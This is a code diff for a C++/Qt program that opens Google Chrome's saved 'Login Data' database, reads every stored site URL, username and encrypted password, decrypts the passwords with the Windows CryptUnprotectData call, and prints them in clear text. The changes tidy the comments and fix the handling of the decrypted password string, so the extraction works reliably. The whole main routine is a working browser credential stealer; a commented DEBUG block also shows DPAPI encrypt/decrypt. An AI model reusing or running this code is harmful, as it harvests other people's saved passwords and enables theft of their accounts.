@@ -1,13 +1,10 @@
-//#pragma comment(lib,"crypt32.lib")
 #include <iostream>
 #include <QCoreApplication>
 #include <QtSql/QSqlDatabase>
 #include <QSqlQuery>
 #include <QString>
-#include <QVariant>
 #include <QDebug>
 #include <QSqlError>
-#include <QTextCodec>
 
 #include <windows.h>
 //#include "dpapi.h"
@@ -20,13 +17,14 @@ int main(int argc, char *argv[])
     QCoreApplication a(argc, argv);
     setlocale(LC_CTYPE, "rus");
 
-    //Connect DB
+    //Connect to DB
     QSqlDatabase db;
     db = QSqlDatabase::addDatabase("QSQLITE");
+    //Get %appdata% folder
     QString appdata = getenv("APPDATA");
     appdata.replace("\\", "/");
+    //Destination folder
     db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
-    //qDebug() << db.databaseName() << endl;
     db.open();
 
 
@@ -39,6 +37,7 @@ int main(int argc, char *argv[])
         //Create SQL Query; select url+login+pass
         QSqlQuery query;
         query.exec("SELECT origin_url, username_value, password_value FROM logins");
+
         while (query.next())
         {
 
@@ -51,49 +50,44 @@ int main(int argc, char *argv[])
             DATA_BLOB DataOut;
             DATA_BLOB * pDataIn = &DataIn;
             DATA_BLOB * pDataOut = &DataOut;
-            BYTE *pbDataInput = reinterpret_cast<byte *>( pass.data() );
-            DWORD cbDataInput = pass.size();//strlen((char *)pbDataInput)+1;
-            DataIn.pbData = pbDataInput;
-            DataIn.cbData = cbDataInput;
 
-            //QByteArray qba = reinterpret_cast<char *>(DataIn.pbData);
-            //QByteArray qba( reinterpret_cast<char *>(DataIn.pbData),  pass.size());//strlen((char *)pbDataInput)+1);
+            DataIn.pbData =  reinterpret_cast<byte *>( pass.data() );  //Pointer to data_input  BYTE*
+            DataIn.cbData = pass.size();                               //Size of input string   DWORD
 
-
-            //qDebug() << pass << endl << qba << endl; //<< qba;//reinterpret_cast<char *>(DataIn.pbData) << endl;
-
-            if (CryptUnprotectData(
+            if (CryptUnprotectData(     //Decryption function
                     pDataIn,
                     NULL,
-                    NULL,               // Optional entropy
+                    NULL,               // Entropy
                     NULL,
                     NULL,
                     0,
                     pDataOut))
             {
-                //QByteArray qba( reinterpret_cast<char *>(DataOut.pbData));
-                qDebug() << endl << url << endl << "user = " << user << "\npass =  " <<  reinterpret_cast<char *>(DataOut.pbData);
+                QString pass_decr;
+                unsigned long pass_size  = static_cast<unsigned long>(DataOut.cbData);
 
-                //qDebug() << qba.data();//reinterpret_cast<char* >(DataOut.pbData);
+                //Get pass string and cut it (pbData doesn't have '\0')
+                pass_decr.append(reinterpret_cast<char *>(DataOut.pbData));
+                pass_decr.resize(pass_size);
+
+                qDebug().noquote() << endl << url << endl << "user = " << user << "\npass =  " << pass_decr;
             }
             else
             {
                 qDebug() << "\nDecryption error!";
-                //qDebug() << endl << reinterpret_cast<char* >(DataOut.pbData);
             }
-
-
-
-
-
         }
     }
 
-    //qDebug() << db.tables() << " ";
 
 
-/*
 
+/*  DEBUG
+
+    //All tables in file
+    qDebug() << db.tables() << " ";
+
+    //Simple example of encryption/decryption
     DATA_BLOB DataIn;
     DATA_BLOB DataOut;
     BYTE *pbDataInput =(BYTE *)"Hello world of data protection.";
@@ -136,7 +130,7 @@ int main(int argc, char *argv[])
             &DataVerify) )
     {
        qDebug() << "The decrypted data is: " << reinterpret_cast<char *>(DataVerify.pbData) << endl;
-       printf("The decrypted data is: %s\n", DataVerify.pbData);
+       //printf("The decrypted data is: %s\n", DataVerify.pbData);
     }
     else qDebug() << "Decryption error!";
 
